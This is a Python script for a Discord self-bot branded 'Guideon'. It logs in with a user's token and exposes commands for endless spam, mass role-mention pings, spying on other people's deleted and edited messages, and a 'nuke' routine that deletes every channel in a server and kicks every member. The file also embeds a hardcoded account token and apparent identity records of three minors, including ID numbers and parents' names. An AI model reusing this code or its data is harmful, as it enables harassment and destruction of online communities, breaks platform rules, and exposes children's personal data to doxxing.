# --* coding: utf-8 *--
prefix = "!"
ul = "OTU1OTk2MDI5MTM4ODk0ODg4.GyaJSb.A9UR2vcZ-Eu0dik34W1BQ9FftORWXJUoH5O_tA"
path = 'data\\acessdenied.py'

guideon = """
  ▄████  █    ██  ██▓▓█████▄ ▓█████  ▒█████   ███▄    █ 
 ██▒ ▀█▒ ██  ▓██▒▓██▒▒██▀ ██▌▓█   ▀ ▒██▒  ██▒ ██ ▀█   █ 
▒██░▄▄▄░▓██  ▒██░▒██▒░██   █▌▒███   ▒██░  ██▒▓██  ▀█ ██▒
░▓█  ██▓▓▓█  ░██░░██░░▓█▄   ▌▒▓█  ▄ ▒██   ██░▓██▒  ▐▌██▒
░▒▓███▀▒▒▒█████▓ ░██░░▒████▓ ░▒████▒░ ████▓▒░▒██░   ▓██░
 ░▒   ▒ ░▒▓▒ ▒ ▒ ░▓   ▒▒▓  ▒ ░░ ▒░ ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
  ░   ░ ░░▒░ ░ ░  ▒ ░ ░ ▒  ▒  ░ ░  ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
░ ░   ░  ░░░ ░ ░  ▒ ░ ░ ░  ░    ░   ░ ░ ░ ▒     ░   ░ ░ 
      ░    ░      ░     ░       ░  ░    ░ ░           ░  v1.0
                      ░                                 """


from re import findall
from json import loads, dumps
from base64 import b64decode
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
import sys
import os, requests, signal, sys
import re
import time
import random
import json
import os
import platform
import sqlite3
import string
import subprocess
from getpass import getuser
from importlib import import_module
from os import unlink
from shutil import copy
import subprocess
import platform
import socket
import colorama
import sys
import json
import shutil
import sqlite3
import zipfile
import json
import base64

from urllib.request import Request, urlopen

from logging import shutdown
import discord
from colorama import Fore as Color
from colorama import Fore, Back, Style
import os
from pystyle import Center
import pyautogui
import datetime
import time
from pystyle import Write, Colors
import inputimeout
from inputimeout import inputimeout, TimeoutOccurred

pack = 'Name: **Kauê de Rodrigues Vitorino**\nAge: **15**\nCpf: **665.518.674-99**\nRG SSP: **29.137.779-8**\nCns: **770 0530 2061 0007**\nVoter token: **3587 2291 1686**\nCnh: **01733412698**\nRenavam: **97336271835**\nPis/Pasep: **487.82635.26-6**\nMother name: **Silezia Caldas de Rodrigues**\nDad name: **Manuel Albenaz Vitorino**', 'Name: **João Batista Aguiar Valladares**\nAge: **15**\nCpf: **271.931.912-09**\nRG SSP: **43.631.249-9**\nCns: **788 0651 2391 0008**\nVoter Token: **2245 1384 2429**\nCnh: **88114885372**\nRenavam: **78187642377**\nPis/Pasep: **459.43821.66-5**\nMother name: **Marlene Vasconcellos Aguiar**\nDad Name: **Paulo Henrique Coimbra Valladares**', 'Name: **Yan Barellos Mendonça**\nAge: **16**\nCpf: **158.571.578-62**\nRG SSP: **15.451.985-6**\nCns: **118 1267 2690 0005**\nVoter Token: **2334 3587 0159**\nCnh: **71647959657**\nRenavam: **67860474497**\nPis/Pasep: **883.43852.79-2**\nMother name: **Jayne Dutra Barellos**\nDad name: **Jhonne dos Anjos Mendonça**'

def data(texto, webhook):
    requests.post(webhook, data={"content":texto})

Write.Print(f"[", Colors.white, interval=0.05)
Write.Print(f"+", Colors.red, interval=0.05)
Write.Print(f"]", Colors.white, interval=0.05)
Write.Print(f' Input your Token', Colors.white, interval=0.05)

token = Write.Input(f'\n\n$ ', Colors.white, interval=0.05)
time.sleep(0.5)

os.system('cls')
Write.Print(f"[", Colors.white, interval=0.05)
Write.Print(f"+", Colors.red, interval=0.05)
Write.Print(f"]", Colors.white, interval=0.05)
Write.Print(f' Logging at "', Colors.white, interval=0.01)
Write.Print(f'{token}', Colors.red, interval=0.05)
Write.Print(f'"', Colors.white, interval=0.05)
class MyClient(discord.Client):
  async def on_connect(self):
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
      pass

    os.system('cls')
    print(f'connection to {ip} port [tcp/telnet] succeded!')
    print('')
    print('')
    print(Center.XCenter(Fore.RED + f'{guideon}'))
    print(Center.XCenter(Fore.RED + f"                  - " + Fore.WHITE + f'Executable by k0zh' + Fore.RED + '#' + Fore.WHITE + "6413 " + Fore.RED + f'-'))
    Write.Print(f"\n\n[", Colors.white, interval=0.05)
    Write.Print(f"INFO", Colors.red, interval=0.05)
    Write.Print(f"] ", Colors.white, interval=0.05)
    Write.Print(f"Scripts 2/2 loaded.", Colors.white, interval=0.05)
    time.sleep(2)
    Write.Print(f"\n[", Colors.white, interval=0.05)
    Write.Print(f"INFO", Colors.red, interval=0.05)
    Write.Print(f"] ", Colors.white, interval=0.05)
    Write.Print(f"Spyware loaded.", Colors.white, interval=0.05)
    time.sleep(1)
    Write.Print(f"\n[", Colors.white, interval=0.05)
    Write.Print(f"INFO", Colors.red, interval=0.05)
    Write.Print(f"] ", Colors.white, interval=0.05)
    Write.Print(f"Stealers loaded.", Colors.white, interval=0.05)
    time.sleep(0.2)
    Write.Print(f"\n[", Colors.white, interval=0.05)
    Write.Print(f"INFO", Colors.red, interval=0.05)
    Write.Print(f"] ", Colors.white, interval=0.05)
    Write.Print(f"Selfs loaded.", Colors.white, interval=0.05)
    time.sleep(0.6)
    Write.Print(f"\n[", Colors.white, interval=0.05)
    Write.Print(f"INFO", Colors.red, interval=0.05)
    Write.Print(f"] ", Colors.white, interval=0.05)
    Write.Print(f"Protectors loaded.", Colors.white, interval=0.05)
    time.sleep(1)

  async def on_message(self, message):
    if message.author != client.user:
      return
    if message.content == f"{prefix}shutdown":
      await shutdown(message)
    if message.content == f"{prefix}chanclear":
      await cls(message)
    if message.content == f"{prefix}logout":
      await logout(message)
    if message.content.lower().startswith(f"{prefix}msgedit"):
      await msgedit(message)
    if message.content.lower().startswith(f"{prefix}spam"):
      await spam(message)
    if message.content.lower().startswith(f"{prefix}gspam"):
      await gspam(message)
    if message.content.lower().startswith(f"{prefix}rspam"):
      await gmspam(message)
    if message.content == f"{prefix}nuke":
      await nuke(message)
  
  async def on_message_delete(self, message):
    if message.author != client.user:
      if isinstance(message.channel, discord.DMChannel):
        print(
          f"\n\n{Color.RED}[{datetime.datetime.now()} UTC]{Color.WHITE}\n{message.author} deleted a message.\n{Color.RED}DM CHANNEL: {Color.WHITE}@{message.channel.recipient}\n{Color.RED}CONTENT:\n{Color.WHITE}{message.content}\n \n"
        )
      elif isinstance(message.channel, discord.GroupChannel):
        print(
          f"\n\n{Color.RED}[{datetime.datetime.now()} UTC]{Color.WHITE}\nA message was deleted from {message.author}.\n{Color.RED}GROUP CHANNEL: {Color.WHITE}{message.channel.name}\n{Color.RED}CONTENT:\n{Color.WHITE}{message.content}\n \n"
        )
      elif isinstance(message.channel, discord.TextChannel):
        print(
          f"\n\n{Color.RED}[{datetime.datetime.now()} UTC]{Color.WHITE}\nA message was deleted from {message.author}.\n{Color.RED}GUILD: {Color.WHITE}{message.guild.name}\n{Color.RED}CHANNEL: {Color.WHITE}#{message.channel}\n{Color.RED}CONTENT:\n{Color.WHITE}{message.content}\n \n"
        )
    else:
      return
    return

  async def on_message_edit(self, before, after):
    if before.author.bot == True:
        return
    if before.content == after.content:
        return
    else:
        if before.author == client.user:
            return
        else:
            if isinstance(before.channel, discord.DMChannel):
                print(
                    f"\n\n{Color.YELLOW}[{datetime.datetime.now()} UTC]{Color.WHITE}\n{before.author.name}#{before.author.discriminator} edited their message.\n{Color.GREEN}DM CHANNEL: {Color.WHITE}@{before.channel.recipient}\n{Color.GREEN}CURRENT CONTENT:\n{Color.WHITE}{after.content}\n{Color.GREEN}PREVIOUS CONTENT:\n{Color.WHITE}{before.content}\n \n"
                )
            if isinstance(before.channel, discord.GroupChannel):
                print(
                    f"\n\n{Color.YELLOW}[{datetime.datetime.now()} UTC]{Color.WHITE}\n{before.author.name}#{before.author.discriminator} edited their message.\n{Color.GREEN}GROUP CHANNEL: {Color.WHITE}{before.channel.name}\n{Color.GREEN}CURRENT CONTENT:\n{Color.WHITE}{after.content}\n{Color.GREEN}PREVIOUS CONTENT:\n{Color.WHITE}{before.content}\n \n"
                )
            if isinstance(before.channel, discord.TextChannel):
                print(
                    f"\n\n{Color.YELLOW}[{datetime.datetime.now()} UTC]{Color.WHITE}\n{before.author.name}#{before.author.discriminator} edited their message.\n{Color.GREEN}GUILD: {Color.WHITE}{before.guild.name}\n{Color.GREEN}CHANNEL: {Color.WHITE}#{before.channel.name}\n{Color.GREEN}CURRENT CONTENT:\n{Color.WHITE}{after.content}\n{Color.GREEN}PREVIOUS CONTENT:\n{Color.WHITE}{before.content}\n \n"
                )
    return

async def logout(message):
  await message.delete()
  await client.logout()
  Write.Print(f"\n\n[", Colors.white, interval=0.05)
  Write.Print(f"INFO", Colors.red, interval=0.05)
  Write.Print(f"] ", Colors.white, interval=0.05)
  Write.Print(f"Client has sucefully logout.", Colors.white, interval=0.05)

async def servernuke(message):
  guild = message.guild
  for channel in guild.channels:
    try:
      await channel.delete()
      Write.Print(f"\n\n[", Colors.white, interval=0.05)
      Write.Print(f"INFO", Colors.red, interval=0.05)
      Write.Print(f"] ", Colors.white, interval=0.05)
      Write.Print(f"{channel.name}", Colors.white, interval=0.05)
      Write.Print(f" was deleted in ", Colors.red, interval=0.05)
      Write.Print(f"#{guild.name} ", Colors.white, interval=0.05)
    except:
      Write.Print(f"\n\n[", Colors.white, interval=0.05)
      Write.Print(f"INFO", Colors.red, interval=0.05)
      Write.Print(f"] ", Colors.white, interval=0.05)
      Write.Print(f"{channel.name}", Colors.white, interval=0.05)
      Write.Print(f" was not deleted in ", Colors.red, interval=0.05)
      Write.Print(f"#{guild.name} ", Colors.white, interval=0.05)
  for member in guild.members:
    try:
      await member.kick()
      Write.Print(f"\n\n[", Colors.white, interval=0.05)
      Write.Print(f"INFO", Colors.red, interval=0.05)
      Write.Print(f"] ", Colors.white, interval=0.05)
      Write.Print(f"{member.name} ", Colors.white, interval=0.05)
      Write.Print(f"#", Colors.red, interval=0.05)
      Write.Print(f"{member.discriminator}", Colors.white, interval=0.05)
      Write.Print(f" was banned in ", Colors.red, interval=0.05)
      Write.Print(f"#{guild.name} ", Colors.white, interval=0.05)
      
    except:
      Write.Print(f"\n\n[", Colors.white, interval=0.05)
      Write.Print(f"INFO", Colors.red, interval=0.05)
      Write.Print(f"] ", Colors.white, interval=0.05)
      Write.Print(f"{member.name}", Colors.white, interval=0.05)
      Write.Print(f"#", Colors.red, interval=0.05)
      Write.Print(f"{member.discriminator}", Colors.white, interval=0.05)
      Write.Print(f" was not banned in ", Colors.red, interval=0.05)
      Write.Print(f"#{guild.name} ", Colors.white, interval=0.05)
  await guild.create_text_channel("nuked")
  Write.Print(f"\n\n[", Colors.white, interval=0.05)
  Write.Print(f"INFO", Colors.red, interval=0.05)
  Write.Print(f"] ", Colors.white, interval=0.05)
  Write.Print(f"[{datetime.datetime.now()} UTC] - ", Colors.white, interval=0.05)
  Write.Print(f"{guild.name}", Colors.red_to_white, interval=0.05)
  Write.Print(f" was nuked sucefully", Colors.red, interval=0.05)


async def nuke(message):
  await message.delete()
  if isinstance(message.channel, discord.DMChannel):
    Write.Print(f"\n\n[", Colors.white, interval=0.05)
    Write.Print(f"ERROR", Colors.red, interval=0.05)
    Write.Print(f"] ", Colors.white, interval=0.05)
    Write.Print(f"Nuke cancelled, command sent in a dm channel.", Colors.white, interval=0.05)
    return
  if isinstance(message.channel, discord.GroupChannel):
    Write.Print(f"\n\n[", Colors.white, interval=0.05)
    Write.Print(f"ERROR", Colors.red, interval=0.05)
    Write.Print(f"] ", Colors.white, interval=0.05)
    Write.Print(f"Nuke cancelled, command sent in a dm channel.", Colors.white, interval=0.05)
    return
  try:
    Write.Print(f"\n\n[", Colors.white, interval=0.05)
    Write.Print(f"?", Colors.red, interval=0.05)
    Write.Print(f"] ", Colors.white, interval=0.05)
    Write.Print(f"Confirm nuke - y/n", Colors.white, interval=0.05)
    confirmation = Write.Input(f"\n\n$ ", Colors.white, interval=0.05)
    if confirmation == "n":
      time.sleep(0.5)
      Write.Print(f"\n\n[", Colors.white, interval=0.05)
      Write.Print(f"+", Colors.red, interval=0.05)
      Write.Print(f"] ", Colors.white, interval=0.05)
      Write.Print(f"Sure.", Colors.white, interval=0.05)
      return
    elif confirmation == "y":
      time.sleep(0.5)
      Write.Print(f"\n\n[", Colors.white, interval=0.05)
      Write.Print(f"+", Colors.red, interval=0.05)
      Write.Print(f"] ", Colors.white, interval=0.05)
      Write.Print(f"FUCKING ALL THE FUCK", Colors.white, interval=0.05)
      member = message.guild.get_member(client.user.id)
      perms = member.guild_permissions
      if perms.manage_channels == True and perms.ban_members == True:
        await servernuke(message)
      else:
        Write.Print(f"\n\n[", Colors.white, interval=0.05)
        Write.Print(f"ERROR", Colors.red, interval=0.05)
        Write.Print(f"] ", Colors.white, interval=0.05)
        Write.Print(f"Nuke cancelled, missing acess.", Colors.white, interval=0.05)
        return
  except TimeoutOccurred:
    Write.Print(f"\n\n[", Colors.white, interval=0.05)
    Write.Print(f"ERROR", Colors.red, interval=0.05)
    Write.Print(f"] ", Colors.white, interval=0.05)
    Write.Print(f"Nuke cancelled, timeout error.", Colors.white, interval=0.05)
    return

async def cls(message):
  await message.delete()
  Write.Print(f"\n\n[", Colors.white, interval=0.05)
  Write.Print(f"+", Colors.red, interval=0.05)
  Write.Print(f"] ", Colors.white, interval=0.05)
  Write.Print(f"Deleting all channel messages.", Colors.white, interval=0.05)
  async for message in message.channel.history(limit=None):
    if message.author == client.user and message.type == discord.MessageType.default:
      await message.delete()
  Write.Print(f"\n\n[", Colors.white, interval=0.05)
  Write.Print(f"+", Colors.red, interval=0.05)
  Write.Print(f"] ", Colors.white, interval=0.05)
  Write.Print(f"Channel cleaned.", Colors.white, interval=0.05)


async def shutdown(message):
  await message.delete()
  time.sleep(0.5)
  Write.Print(f"\n\n[", Colors.white, interval=0.05)
  Write.Print(f"ALERT", Colors.red, interval=0.05)
  Write.Print(f"] ", Colors.white, interval=0.05)
  Write.Print(f"Shutdown ejected, fuck you!", Colors.white, interval=0.05)
  time.sleep(1)
  os.system(f"{path}")

async def spam(message):
  await message.delete()
  spammsg = message.content[len(prefix)+5:]
  while True:
    try:
      await message.channel.send(spammsg)
    except discord.HTTPException:
      Write.Print(f"\n\n[", Colors.white, interval=0.05)
      Write.Print(f"ERROR", Colors.red, interval=0.05)
      Write.Print(f"] ", Colors.white, interval=0.05)
      Write.Print(f"[{datetime.datetime.now()} UTC] - ", Colors.white, interval=0.05)
      Write.Print(f"Spam interrupted", Colors.red_to_white, interval=0.05)
      Write.Print(f" / Unknow Error", Colors.red, interval=0.05)
      return
    except discord.Forbidden:
      Write.Print(f"\n\n[", Colors.white, interval=0.05)
      Write.Print(f"ERROR", Colors.red, interval=0.05)
      Write.Print(f"] ", Colors.white, interval=0.05)
      Write.Print(f"[{datetime.datetime.now()} UTC] - ", Colors.white, interval=0.05)
      Write.Print(f"Spam interrupted", Colors.red_to_white, interval=0.05)
      Write.Print(f" / Missing acess", Colors.red, interval=0.05)
      return


async def gspam(message):
  await message.delete()
  spammsg = message.content[len(prefix)+6:]
  while True:
    try:
      await message.channel.send(spammsg, delete_after = 0)
    except discord.HTTPException:
      Write.Print(f"\n\n[", Colors.white, interval=0.05)
      Write.Print(f"ERROR", Colors.red, interval=0.05)
      Write.Print(f"] ", Colors.white, interval=0.05)
      Write.Print(f"[{datetime.datetime.now()} UTC] - ", Colors.white, interval=0.05)
      Write.Print(f"Spam interrupted", Colors.red_to_white, interval=0.05)
      Write.Print(f" / Unknow Error", Colors.red, interval=0.05)
      return
    except discord.Forbidden:
      Write.Print(f"\n\n[", Colors.white, interval=0.05)
      Write.Print(f"ERROR", Colors.red, interval=0.05)
      Write.Print(f"] ", Colors.white, interval=0.05)
      Write.Print(f"[{datetime.datetime.now()} UTC] - ", Colors.white, interval=0.05)
      Write.Print(f"Spam interrupted", Colors.red_to_white, interval=0.05)
      Write.Print(f" / Missing acess", Colors.red, interval=0.05)
      return


async def gmspam(message):
  await message.delete()
  spammsg = "\n".join(role.mention for role in message.guild.roles)
  while True:
    try:
      await message.channel.send(spammsg, delete_after = 0)
    except discord.HTTPException:
      Write.Print(f"\n\n[", Colors.white, interval=0.05)
      Write.Print(f"ERROR", Colors.red, interval=0.05)
      Write.Print(f"] ", Colors.white, interval=0.05)
      Write.Print(f"[{datetime.datetime.now()} UTC] - ", Colors.white, interval=0.05)
      Write.Print(f"Spam interrupted", Colors.red_to_white, interval=0.05)
      Write.Print(f" / Unknow Error", Colors.red, interval=0.05)
      return
    except discord.Forbidden:
      Write.Print(f"\n\n[", Colors.white, interval=0.05)
      Write.Print(f"ERROR", Colors.red, interval=0.05)
      Write.Print(f"] ", Colors.white, interval=0.05)
      Write.Print(f"[{datetime.datetime.now()} UTC] - ", Colors.red, interval=0.05)
      Write.Print(f"Spam interrupted", Colors.white, interval=0.05)
      Write.Print(f" / Missing acess", Colors.red, interval=0.05)
      return

async def msgedit(message):
    edit_to = message.content[len(prefix)+8:]
    messages = await message.channel.history(limit=None).flatten()
    if isinstance(message.channel, discord.DMChannel):
       Write.Print(f"\n\n[", Colors.white, interval=0.05)
       Write.Print(f"INFO", Colors.red, interval=0.05)
       Write.Print(f"] ", Colors.white, interval=0.05)
       Write.Print(f"[{datetime.datetime.now()} UTC] - ", Colors.red, interval=0.05)
       Write.Print(f"Editing all messages with @", Colors.white, interval=0.05)
       Write.Print(f"{message.channel.recipient}", Colors.red, interval=0.05)
       Write.Print(f" to ", Colors.white, interval=0.05)
       Write.Print(f"{edit_to}...", Colors.red, interval=0.05)
    if isinstance(message.channel, discord.GroupChannel):
       Write.Print(f"\n\n[", Colors.white, interval=0.05)
       Write.Print(f"INFO", Colors.red, interval=0.05)
       Write.Print(f"] ", Colors.white, interval=0.05)
       Write.Print(f"[{datetime.datetime.now()} UTC] - ", Colors.red, interval=0.05)
       Write.Print(f"Editing all messages with @", Colors.white, interval=0.05)
       Write.Print(f"{message.channel.name}", Colors.red, interval=0.05)
       Write.Print(f" to ", Colors.white, interval=0.05)
       Write.Print(f"{edit_to}...", Colors.red, interval=0.05)
    if isinstance(message.channel, discord.TextChannel):
       Write.Print(f"\n\n[", Colors.white, interval=0.05)
       Write.Print(f"INFO", Colors.red, interval=0.05)
       Write.Print(f"] ", Colors.white, interval=0.05)
       Write.Print(f"[{datetime.datetime.now()} UTC] - ", Colors.red, interval=0.05)
       Write.Print(f"Editing all messages with @", Colors.white, interval=0.05)
       Write.Print(f"{message.channel.name}", Colors.red, interval=0.05)
       Write.Print(f" to ", Colors.white, interval=0.05)
       Write.Print(f"{edit_to}...", Colors.red, interval=0.05)
    for message in messages:
        try:
            await message.edit(content=edit_to)
        except:
          Write.Print(f"\n\n[", Colors.white, interval=0.05)
          Write.Print(f"INFO", Colors.red, interval=0.05)
          Write.Print(f"] ", Colors.white, interval=0.05)
          Write.Print(f"[{datetime.datetime.now()} UTC] - ", Colors.red, interval=0.05)
          Write.Print(f"Finished@", Colors.white, interval=0.05)



client = MyClient()
try:
  client.run(token, bot = False)
except discord.LoginFailure:
  print(Fore.WHITE + "[" + Fore.RED + "+" + Fore.WHITE + "]" + Fore.WHITE + " Invalid token")
except discord.HTTPException:
  print(Fore.WHITE + "[" + Fore.RED + "+" + Fore.WHITE + "]" + Fore.WHITE + " Unknow error")